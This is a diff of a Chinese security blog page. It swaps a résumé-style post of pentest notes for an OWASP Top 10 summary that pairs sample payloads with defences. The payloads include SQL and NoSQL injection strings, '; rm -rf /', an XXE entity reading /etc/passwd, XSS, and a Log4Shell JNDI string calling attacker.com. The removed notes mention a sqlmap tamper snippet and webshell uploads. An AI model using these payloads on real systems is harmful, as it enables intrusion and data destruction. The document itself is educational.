@@ -19,21 +19,21 @@
   <meta name="author" content="MaskObito">
   <meta name="keywords" content="">
   
-    <meta name="description" content="渗透测试  精通OWASP Top 10漏洞原理及利用技术，熟练运用MITRE ATT&amp;CK框架进行威胁建模，具备企业级网络安全架构渗透测试经验（涵盖Web应用、API、内网横向移动、移动应用等场景）。掌握渗透测试全流程（信息搜集、漏洞探测、漏洞利用、权限维持、痕迹清除），擅长制定针对性测试方案，曾主导多个小型企业网络安全评估项目，累计发现高危漏洞超15个。  Web安全工具：精通Bur">
+    <meta name="description" content="owasp十大漏洞知识点 1. 注入（Injection） 原理：攻击者将恶意数据（如SQL、OS命令、NoQL）插入解释器中，欺骗解释器执行非预期命令。 利用方式： SQL注入：&#39; OR &#39;1&#39;&#x3D;&#39;1 绕过登录；UNION SELECT 窃取数据。 命令注入：; rm -rf &#x2F; 在参数中拼接系统命令。 NoSQL注入：&#123;&quot;$ne&quot;:">
 <meta property="og:type" content="article">
-<meta property="og:title" content="部分总结">
-<meta property="og:url" content="http://maskobito.github.io/2025/01/01/%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:title" content="OWASP漏洞">
+<meta property="og:url" content="http://maskobito.github.io/2025/01/16/OWASP%E6%BC%8F%E6%B4%9E/index.html">
 <meta property="og:site_name" content="MaskObito">
-<meta property="og:description" content="渗透测试  精通OWASP Top 10漏洞原理及利用技术，熟练运用MITRE ATT&amp;CK框架进行威胁建模，具备企业级网络安全架构渗透测试经验（涵盖Web应用、API、内网横向移动、移动应用等场景）。掌握渗透测试全流程（信息搜集、漏洞探测、漏洞利用、权限维持、痕迹清除），擅长制定针对性测试方案，曾主导多个小型企业网络安全评估项目，累计发现高危漏洞超15个。  Web安全工具：精通Bur">
+<meta property="og:description" content="owasp十大漏洞知识点 1. 注入（Injection） 原理：攻击者将恶意数据（如SQL、OS命令、NoQL）插入解释器中，欺骗解释器执行非预期命令。 利用方式： SQL注入：&#39; OR &#39;1&#39;&#x3D;&#39;1 绕过登录；UNION SELECT 窃取数据。 命令注入：; rm -rf &#x2F; 在参数中拼接系统命令。 NoSQL注入：&#123;&quot;$ne&quot;:">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2024-12-31T23:52:03.000Z">
-<meta property="article:modified_time" content="2025-08-18T16:40:05.029Z">
+<meta property="article:published_time" content="2025-01-16T12:44:00.000Z">
+<meta property="article:modified_time" content="2025-08-18T16:43:00.580Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary_large_image">
   
   
   
-  <title>部分总结 - MaskObito</title>
+  <title>OWASP漏洞 - MaskObito</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -203,7 +203,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="部分总结"></span>
+            <span id="subtitle" data-typed-text="OWASP漏洞"></span>
           
         </div>
 
@@ -214,8 +214,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2025-01-01 07:52" pubdate>
-          2025年1月1日 早上
+        <time datetime="2025-01-16 20:44" pubdate>
+          2025年1月16日 晚上
         </time>
       </span>
     
@@ -226,7 +226,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.3k 字
+          976 字
         
       </span>
     
@@ -237,7 +237,7 @@
         
         
         
-          11 分钟
+          9 分钟
         
       </span>
     
@@ -274,48 +274,113 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">部分总结</h1>
+            <h1 id="seo-header">OWASP漏洞</h1>
             
             
               <div class="markdown-body">
                 
-                <ol>
-<li><p><em>渗透测试</em><br>  <em>精通OWASP Top 10漏洞原理及利用技术，熟练运用MITRE ATT&amp;CK框架进行威胁建模，具备企业级网络安全架构渗透测试经验（涵盖Web应用、API、内网横向移动、移动应用等场景）。</em><br><em>掌握渗透测试全流程（信息搜集、漏洞探测、漏洞利用、权限维持、痕迹清除），擅长制定针对性测试方案，曾主导多个小型企业网络安全评估项目，累计发现高危漏洞超15个。</em></p>
+                <h1 id="owasp十大漏洞知识点"><a href="#owasp十大漏洞知识点" class="headerlink" title="owasp十大漏洞知识点"></a>owasp十大漏洞知识点</h1><hr>
+<h3 id="1-注入（Injection）"><a href="#1-注入（Injection）" class="headerlink" title="1. 注入（Injection）"></a>1. <strong>注入（Injection）</strong></h3><ul>
+<li><strong>原理</strong>：攻击者将恶意数据（如SQL、OS命令、NoQL）插入解释器中，欺骗解释器执行非预期命令。</li>
+<li><strong>利用方式</strong>：<ul>
+<li><strong>SQL注入</strong>：<code>&#39; OR &#39;1&#39;=&#39;1</code> 绕过登录；<code>UNION SELECT</code> 窃取数据。</li>
+<li><strong>命令注入</strong>：<code>; rm -rf /</code> 在参数中拼接系统命令。</li>
+<li><strong>NoSQL注入</strong>：<code>&#123;&quot;$ne&quot;: &quot;1&quot;&#125;</code> 绕过MongoDB查询。</li>
+</ul>
 </li>
-<li><p><em>Web安全工具：精通Burp Suite全模块操作（Intruder爆破、Repeater、Decoder），擅长自定义插件开发；熟练使用SQLmap、Dirsearch、Nmap、中国蚁剑等工具进行自动化漏洞检测，结合手工测试提升漏洞发现率。</em><br>  3.<em>编程语言：熟练运用Python&#x2F;C&#x2F;Java&#x2F;PHP开发安全脚本与工具（如漏洞扫描器、流量分析脚本），Python获蓝桥杯线下省二等奖，精通动态规划、树状数组、回溯、贪心、滑动窗口递归双指针等，精通将数据结构与算法优化应用于漏洞特征匹配（如二分查找+SQL布尔盲注、堆叠注入、时间盲注绕过waf）。</em></p>
+<li><strong>防御</strong>：参数化查询（Prepared Statements）、输入验证、ORM框架、最小权限原则。</li>
+</ul>
+<hr>
+<h3 id="2-失效的身份认证（Broken-Authentication）"><a href="#2-失效的身份认证（Broken-Authentication）" class="headerlink" title="2. 失效的身份认证（Broken Authentication）"></a>2. <strong>失效的身份认证（Broken Authentication）</strong></h3><ul>
+<li><strong>原理</strong>：身份验证或会话管理机制存在缺陷，导致账户被接管。</li>
+<li><strong>利用方式</strong>：<ul>
+<li>暴力破解弱密码（如<code>admin/password</code>）。</li>
+<li>窃取Session ID（XSS、网络嗅探）。</li>
+<li>滥用密码重置逻辑（如未验证邮箱所有权）。</li>
+</ul>
 </li>
-<li><p><em>漏洞研究与代码审计</em><br>  <em>深入研究且精通SQL注入、文件包含、命令执行、反序列化等漏洞原理，具备PHP&#x2F;Java代码审计能力，熟悉网络协议分析（TCP&#x2F;IP、HTTP&#x2F;HTTPS），熟练使用并分析mysql数据库，擅长使用Fiddler、Wireshark、科来网络分析系统进行流量抓包与安全事件溯源。</em></p>
+<li><strong>防御</strong>：多因素认证（MFA）、强密码策略、安全存储Session、HTTPS加密。</li>
+</ul>
+<hr>
+<h3 id="3-敏感数据泄露（Sensitive-Data-Exposure）"><a href="#3-敏感数据泄露（Sensitive-Data-Exposure）" class="headerlink" title="3. 敏感数据泄露（Sensitive Data Exposure）"></a>3. <strong>敏感数据泄露（Sensitive Data Exposure）</strong></h3><ul>
+<li><strong>原理</strong>：未加密或弱加密保护敏感数据（密码、信用卡号）。</li>
+<li><strong>利用方式</strong>：<ul>
+<li>窃取未加密的传输数据（中间人攻击）。</li>
+<li>获取备份数据库（如AWS S3公开访问）。</li>
+</ul>
 </li>
+<li><strong>防御</strong>：TLS加密传输、静态数据加密（AES-256）、禁用缓存敏感数据、密钥管理。</li>
+</ul>
+<hr>
+<h3 id="4-XML外部实体（XXE）"><a href="#4-XML外部实体（XXE）" class="headerlink" title="4. XML外部实体（XXE）"></a>4. <strong>XML外部实体（XXE）</strong></h3><ul>
+<li><strong>原理</strong>：解析恶意XML时，引用外部实体导致文件读取&#x2F;SSRF。</li>
+<li><strong>利用方式</strong>：<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure>
+读取服务器文件或发起内网请求。</li>
+<li><strong>防御</strong>：禁用DTD&#x2F;外部实体（如<code>libxml_disable_entity_loader</code>）、使用JSON替代XML。</li>
+</ul>
+<hr>
+<h3 id="5-失效的访问控制（Broken-Access-Control）"><a href="#5-失效的访问控制（Broken-Access-Control）" class="headerlink" title="5. 失效的访问控制（Broken Access Control）"></a>5. <strong>失效的访问控制（Broken Access Control）</strong></h3><ul>
+<li><strong>原理</strong>：未对用户权限进行校验，允许越权操作。</li>
+<li><strong>利用方式</strong>：<ul>
+<li>修改URL参数（如<code>/user?id=123</code> → <code>id=124</code>）访问他人数据。</li>
+<li>未授权访问管理接口（如<code>/admin</code> 无鉴权）。</li>
+</ul>
+</li>
+<li><strong>防御</strong>：RBAC权限模型、服务端校验所有权、默认拒绝原则。</li>
+</ul>
+<hr>
+<h3 id="6-安全配置错误（Security-Misconfiguration）"><a href="#6-安全配置错误（Security-Misconfiguration）" class="headerlink" title="6. 安全配置错误（Security Misconfiguration）"></a>6. <strong>安全配置错误（Security Misconfiguration）</strong></h3><ul>
+<li><strong>原理</strong>：默认配置、冗余功能、错误HTTP头导致暴露漏洞。</li>
+<li><strong>利用方式</strong>：<ul>
+<li>访问未删除的调试页面（如<code>/phpinfo.php</code>）。</li>
+<li>利用默认密码登录（Tomcat <code>admin:admin</code>）。</li>
+</ul>
+</li>
+<li><strong>防御</strong>：最小化安装、定期扫描配置、自动化部署（如Ansible）、禁用目录列表。</li>
+</ul>
+<hr>
+<h3 id="7-跨站脚本（XSS）"><a href="#7-跨站脚本（XSS）" class="headerlink" title="7. 跨站脚本（XSS）"></a>7. <strong>跨站脚本（XSS）</strong></h3><ul>
+<li><strong>原理</strong>：恶意脚本注入到网页中，在用户浏览器执行。</li>
+<li><strong>类型与利用</strong>：<ul>
+<li><strong>反射型XSS</strong>：通过钓鱼链接传播（<code>http://site.com?search=&lt;script&gt;alert(1)&lt;/script&gt;</code>）。</li>
+<li><strong>存储型XSS</strong>：恶意评论存入数据库，所有用户加载时触发。</li>
+<li><strong>DOM型XSS</strong>：前端JS操作DOM时未转义（如<code>document.write(location.hash)</code>）。</li>
+</ul>
+</li>
+<li><strong>防御</strong>：输出编码（HTML&#x2F;JS&#x2F;CSS）、CSP策略、输入验证、<code>HttpOnly</code> Cookie。</li>
+</ul>
+<hr>
+<h3 id="8-不安全的反序列化（Insecure-Deserialization）"><a href="#8-不安全的反序列化（Insecure-Deserialization）" class="headerlink" title="8. 不安全的反序列化（Insecure Deserialization）"></a>8. <strong>不安全的反序列化（Insecure Deserialization）</strong></h3><ul>
+<li><strong>原理</strong>：反序列化恶意数据导致远程代码执行（RCE）或权限提升。</li>
+<li><strong>利用方式</strong>：<ul>
+<li>Java反序列化漏洞（如Apache Commons Collections）。</li>
+<li>篡改Cookie中的序列化对象提升权限。</li>
+</ul>
+</li>
+<li><strong>防御</strong>：避免反序列化用户输入、使用JSON、签名验证数据完整性。</li>
+</ul>
+<hr>
+<h3 id="9-使用含已知漏洞的组件（Vulnerable-Components）"><a href="#9-使用含已知漏洞的组件（Vulnerable-Components）" class="headerlink" title="9. 使用含已知漏洞的组件（Vulnerable Components）"></a>9. <strong>使用含已知漏洞的组件（Vulnerable Components）</strong></h3><ul>
+<li><strong>原理</strong>：第三方库（如Log4j、Struts）存在公开漏洞。</li>
+<li><strong>利用方式</strong>：<ul>
+<li>CVE-2021-44228（Log4Shell）：<code>$&#123;jndi:ldap://attacker.com/exp&#125;</code> 触发RCE。</li>
+</ul>
+</li>
+<li><strong>防御</strong>：依赖扫描工具（OWASP Dependency-Check）、定期更新、移除无用依赖。</li>
+</ul>
+<hr>
+<h3 id="10-日志与监控不足（Insufficient-Logging-Monitoring）"><a href="#10-日志与监控不足（Insufficient-Logging-Monitoring）" class="headerlink" title="10. 日志与监控不足（Insufficient Logging &amp; Monitoring）"></a>10. <strong>日志与监控不足（Insufficient Logging &amp; Monitoring）</strong></h3><ul>
+<li><strong>原理</strong>：未记录关键事件（登录失败、异常请求），导致攻击无法追溯。</li>
+<li><strong>利用方式</strong>：攻击者横向移动而不触发告警（如数据窃取数月未被发现）。</li>
+<li><strong>防御</strong>：集中化日志（ELK&#x2F;Splunk）、实时监控、设置告警阈值（如5分钟内20次登录失败）。</li>
+</ul>
+<hr>
+<h3 id="关键防御策略"><a href="#关键防御策略" class="headerlink" title="关键防御策略"></a>关键防御策略</h3><ol>
+<li><strong>纵深防御</strong>：多层安全措施（WAF+输入校验+编码+最小权限）。</li>
+<li><strong>自动化工具</strong>：SAST&#x2F;DAST扫描（如ZAP、Burp Suite）、依赖检查。</li>
+<li><strong>安全意识</strong>：开发人员安全培训（如安全编码规范）。</li>
+<li><strong>威胁建模</strong>：设计阶段识别潜在风险（如STRIDE模型）。</li>
 </ol>
-<p><em>项目一：中铁港航东南海洋工程有限公司全栈渗透测试项目 | 2025.02-2025.04</em><br><em>项目背景：在该企业实习期间，为集团旗下Web网址及内部网络进行全方位安全评估，防范数据泄露风险。</em><br><em>采用“黑盒+白盒”测试模式，使用Nmap扫描内网资产，结合BP爆破敏感接口，通过sql布尔盲注发现3处未授权访问漏洞，导致核心用户数据可被遍历。</em><br>*-通过PHP代码审计定位文件上传漏洞，利用蚁剑实现服务器权限获取getshell，进一步横向移动发现域控服务器弱口令，最终完成渗透测试</p>
-<p><em>项目成果：累计发现中危漏洞15个，协助企业建立漏洞管理体系，获该企业奖金5k</em></p>
-<p>http明文传输，https用ssl加密传输,ssl防窃听防中间人</p>
-<p>MITRE ATT&amp;CK是一个知识库，用来规划攻击的</p>
-<p>–tamper&#x3D;space2comment.py</p>
-<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-keyword">if</span> payload:<br>    retVal = base64<span class="hljs-selector-class">.b64encode</span>(payload<span class="hljs-selector-attr">[::-1]</span><span class="hljs-selector-class">.encode</span>(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>    retVal = base64<span class="hljs-selector-class">.b64encode</span>(retVal<span class="hljs-selector-attr">[::-1]</span>)<span class="hljs-selector-class">.decode</span>(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;+++++++++++++&quot;</span>+retVal)<br></code></pre></td></tr></table></figure>
-
-<p>堆叠注入用；布尔盲注根据抓包回显判断，benchmark时间盲注</p>
-<p><strong>XSS、越权访问（水平&#x2F;垂直）命令执行、反序列化、文件上传&#x2F;包含&#x2F;路径遍历</strong></p>
-<p>跨站脚本攻击，将<code>&lt;script&gt;</code> 标签代码执行，反射型不会存储在服务器如钓鱼邮件，存储型长期在服务器上，窃取 Cookie，利用受害者身份进行攻击，如拒绝式服务攻击。</p>
-<p>system()    &#x2F;&#x2F; 执行外部程序并显示输出。过滤后可以用passthru。eval($c); 使用 eval() 函数执行 $c 变量中的代码。eval() 会将 $c 中的字符串作为 PHP 代码执行，这可能导致执行任意 PHP 代码，从而形成安全漏洞。调用shell.php，传入cmd，system ls，system cat tac</p>
-<p>本地文件包含漏洞（LFI   伪协议input； data：相对路径被过滤，服务器禁止访问根目录；<strong>include</strong>：当包含 .php 文件时会执行其中的代码，非显示源码z</p>
-<p>大小写绕过，过滤php可以用session，文件可控</p>
-<p>webshell：通过抓包改ua头上传恶意php，在用get或者post传参执行命令</p>
-<p>防御：不要直接包含用户输入，open_base限制PHP可访问的目录</p>
-<p>写脚本监控日志防止数据库泄露</p>
-<p>array检查是否是数组</p>
-<p><strong>编程语言</strong></p>
-<p>sql注入加上python二分查找大大减少爆破时间</p>
-<p><strong>mysql数据库</strong></p>
-<p>联合查询union select，增删查改</p>
-<p><strong>我熟练使用SQLmap进行自动化SQL注入检测和利用，用Dirsearch&#x2F;Nmap进行资产发现和目录扫描，用蚁剑管理Webshell</strong></p>
-<p><strong>漏洞研究</strong></p>
-<p>如文件上传欺骗改文件后缀php改成jpg绕过waf，执行恶意代码</p>
-<p><strong>我擅长使用Fiddler、Wireshark、科来网络分析系统进行流量抓包和分析</strong></p>
-<p><strong>‘黑盒测试+白盒审计</strong></p>
-<p>使用nmap扫描ip，开放端口，在线主机，dirsearch收集子域名，用sqlmap，bp对登录接口、用户查询接口、订单查询接口等<strong>敏感功能点</strong>进行手工测试</p>
-<p>**代码审计突破 (白盒)**发现文件上传漏洞，直接引用参数，应该先进行如base64，url编码，或添加死亡die函数，上传whoami等获得管理员信息，弱密码爆破</p>
-<p>、<strong>SQL注入</strong>和<strong>越权访问 是最常见的，通过PHP代码审计发现文件上传漏洞并最终拿到域控权限</strong></p>
 
                 
               </div>
@@ -333,8 +398,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>部分总结</div>
-      <div>http://maskobito.github.io/2025/01/01/部分总结/</div>
+      <div>OWASP漏洞</div>
+      <div>http://maskobito.github.io/2025/01/16/OWASP漏洞/</div>
     </div>
     <div class="license-meta">
       
@@ -346,7 +411,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2025年1月1日</div>
+          <div>2025年1月16日</div>
         </div>
       
       
@@ -378,15 +443,21 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2025/01/02/%E6%B5%8B%E8%AF%95%EF%BC%88%E5%9B%BE%E7%89%87%EF%BC%89/" title="sql注入">
+                      <a href="/2025/01/17/POC/" title="POC">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">sql注入</span>
+                        <span class="hidden-mobile">POC</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
                   </article>
                   <article class="post-next col-6">
                     
+                    
+                      <a href="/2025/01/15/Log4j2%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="Log4j2的JNDI注入漏洞复现">
+                        <span class="hidden-mobile">Log4j2的JNDI注入漏洞复现</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
                     
                   </article>
                 </div>
